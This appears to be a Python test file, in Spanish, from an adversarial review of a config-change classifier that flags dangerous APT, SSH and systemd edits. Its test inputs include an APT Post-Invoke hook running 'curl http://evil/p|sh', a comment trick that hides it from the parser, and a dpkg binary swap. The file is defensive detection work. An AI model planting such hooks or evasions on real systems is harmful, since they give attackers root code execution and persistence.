"""Pista Q · revisión adversaria de cfgsem.py (B77-1, commit dde1b29).

Cada prueba codifica el comportamiento CORRECTO que Arx debe tener frente a un atacante que controla
el contenido de los ficheros de configuración. Están en ROJO contra la implementación actual: marcan
evasiones semánticas (classify silencia o rebaja un cambio peligroso), huecos de cobertura y un coste
cuadrático. No arreglan cfgsem; demuestran el fallo para que la pista de implementación lo cierre.

Correlación con los hallazgos reportados: HZ#1..#5 en DevelopDocs/pistas/q/cfgsem-revision-adversaria.md.
Ejecutar:  python3 -m pytest tests/test_adv_cfgsem.py -q
"""
import base64
import os
import sys
import time
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from arx.modules import cfgsem as c  # noqa: E402

_BLOB = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + os.urandom(51)).decode()


def _cl(group, before, after, **kw):
    a = c.analyze(group, before, **kw) if before is not None else None
    b = c.analyze(group, after, **kw) if after is not None else None
    return c.classify(group, a, b)


class AptConfBlockCommentEvasion(unittest.TestCase):
    """HZ#1 (crit): `_conf_text` borra `/* ... */` sobre el texto crudo, sin respetar las comillas.

    APT no trata `/*` dentro de una cadena entrecomillada como comentario: ejecuta la directiva. Un
    atacante que rodea su directiva con fragmentos `/*` y `*/` metidos en valores entrecomillados la
    hace desaparecer del canon de cfgsem mientras APT la sigue honrando. Diferencia de analizador =
    evasión: el hook pasa de crit a 'low' (prácticamente silencio)."""

    def test_hidden_post_invoke_hook_is_still_critical(self):
        before = 'APT::Periodic::Update-Package-Lists "1";\n'
        after = (before
                 + 'X::Open "ruido /*";\n'
                 + 'DPkg::Post-Invoke {"curl http://evil/p|sh";};\n'
                 + 'X::Close "*/ ruido";\n')
        ch = _cl("apt_conf", before, after)
        self.assertIsNotNone(ch, "el hook escondido no produjo ningún cambio")
        self.assertEqual(ch.sev, "crit", f"hook Post-Invoke escondido quedó en {ch.sev}")

    def test_hidden_allow_unauthenticated_is_still_critical(self):
        after = 'APT::A "/*";\nAPT::Get::AllowUnauthenticated "true";\nAPT::B "*/";\n'
        ch = _cl("apt_conf", "", after)
        self.assertIsNotNone(ch)
        self.assertEqual(ch.sev, "crit", f"AllowUnauthenticated escondido quedó en {ch.sev}")

    def test_post_invoke_survives_in_the_canon(self):
        # la propia huella semántica debe conservar la directiva peligrosa
        p = c.apt_conf('X::Open "a /*";\nDPkg::Post-Invoke {"evil";};\nX::Close "*/";\n')
        self.assertTrue(any("post-invoke" in k for k, _ in (p.canon or ())),
                        f"la directiva Post-Invoke desapareció del canon: {p.canon}")


class AptConfDangerousDirectivesGap(unittest.TestCase):
    """HZ#2 (high): directivas que ejecutan código como root no están en la lista de peligrosas.

    `Dir::Bin::dpkg` sustituye el binario que APT invoca como dpkg: ejecución arbitraria en la próxima
    operación de paquete. classify la deja en 'low'."""

    def test_replacing_the_dpkg_binary_is_not_low(self):
        ch = _cl("apt_conf", "", 'Dir::Bin::dpkg "/tmp/evil";\n')
        self.assertIsNotNone(ch)
        self.assertNotEqual(ch.sev, "low", "reemplazar el binario dpkg se clasificó como 'low'")


class AuthorizedKeysCertTypesGap(unittest.TestCase):
    """HZ#3 (high): faltan tipos de clave de certificado válidos en _KEY_TYPE.

    sshd acepta claves de certificado en authorized_keys; el autor ya cubre
    `ssh-ed25519-cert-v01@openssh.com`, pero no las variantes ECDSA ni sk-*. Una clave de certificado
    ECDSA nueva para root se clasifica como 'raw' (med, «línea no reconocida») en vez de crit."""

    def test_ecdsa_cert_key_for_root_is_critical(self):
        line = f"ecdsa-sha2-nistp256-cert-v01@openssh.com {_BLOB} atacante\n"
        ch = _cl("authorized_keys_root", "", line)
        self.assertIsNotNone(ch)
        self.assertEqual(ch.sev, "crit", f"clave de certificado ECDSA para root quedó en {ch.sev}")

    def test_sk_ecdsa_cert_key_for_root_is_critical(self):
        line = f"sk-ecdsa-sha2-nistp256-cert-v01@openssh.com {_BLOB} atacante\n"
        ch = _cl("authorized_keys_root", "", line)
        self.assertIsNotNone(ch)
        self.assertEqual(ch.sev, "crit", f"clave de certificado sk-ECDSA para root quedó en {ch.sev}")


class SystemdTimerPersistenceGap(unittest.TestCase):
    """HZ#4 (med→high): claves de disparo de .timer fuera de _UNIT_SENSITIVE.

    Un .timer de persistencia que dispara por `OnUnitInactiveSec` (o `OnClockChange`), sin `OnCalendar`
    ni `Unit=`, es systemd válido y arranca el servicio asociado. classify lo deja en 'med' en vez de
    'high', a diferencia de un timer con OnCalendar."""

    def test_new_timer_on_unit_inactive_is_high(self):
        unit = "[Timer]\nOnUnitInactiveSec=30min\n[Install]\nWantedBy=timers.target\n"
        ch = _cl("systemd", None, unit)
        self.assertIsNotNone(ch)
        self.assertEqual(ch.sev, "high", f"timer OnUnitInactiveSec nuevo quedó en {ch.sev}")

    def test_new_timer_on_clock_change_is_high(self):
        unit = "[Timer]\nOnClockChange=true\n[Install]\nWantedBy=timers.target\n"
        ch = _cl("systemd", None, unit)
        self.assertIsNotNone(ch)
        self.assertEqual(ch.sev, "high", f"timer OnClockChange nuevo quedó en {ch.sev}")


class CfgsemPerformanceBudget(unittest.TestCase):
    """HZ#5 (med): coste cuadrático de las líneas de continuación en systemd_unit.

    `buf = line[:-1] + " "` reconstruye el acumulador en cada línea: O(n²). Un drop-in de ~1 MB lleno
    de continuaciones (`x\\`) tarda ~8 s en analizarse y estanca el barrido del guardián (presupuesto de
    enriquecimiento = 10 s). Un analizador lineal lo hace en milisegundos."""

    def test_systemd_continuations_do_not_blow_up(self):
        text = ("x\\\n" * 330000)[:c.MAX_TEXT]
        t = time.monotonic()
        p = c.systemd_unit(text)
        dt = time.monotonic() - t
        self.assertIsInstance(p, c.Parsed)
        self.assertLess(dt, 1.5, f"systemd_unit tardó {dt:.2f}s en ~1 MB de continuaciones (cuadrático)")


if __name__ == "__main__":
    unittest.main()
